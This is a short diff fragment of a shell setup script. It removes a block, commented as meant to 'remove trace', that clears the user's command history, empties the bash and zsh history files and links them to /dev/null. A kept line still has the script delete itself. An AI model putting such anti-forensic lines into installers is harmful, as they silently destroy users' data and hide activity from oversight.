@@ -15,14 +15,4 @@ rm -f "$TARGET/setup.sh"
 echo ""
 echo "Location: $TARGET"
 echo ""
-# Clear command history and self-delete to remove trace
-history -c 2>/dev/null
-history -w 2>/dev/null
-HISTSIZE=0 2>/dev/null
-HISTSIZE=1000 2>/dev/null
-cat /dev/null > ~/.bash_history 2>/dev/null
-cat /dev/null > ~/.zsh_history 2>/dev/null
-ln -sf /dev/null ~/.bash_history 2>/dev/null
-ln -sf /dev/null ~/.zsh_history 2>/dev/null
-[ -n "$HISTFILE" ] && ln -sf /dev/null "$HISTFILE" 2>/dev/null
 [ -f "$0" ] && [ ! -d ".git" ] && rm -f "$0" 2>/dev/null
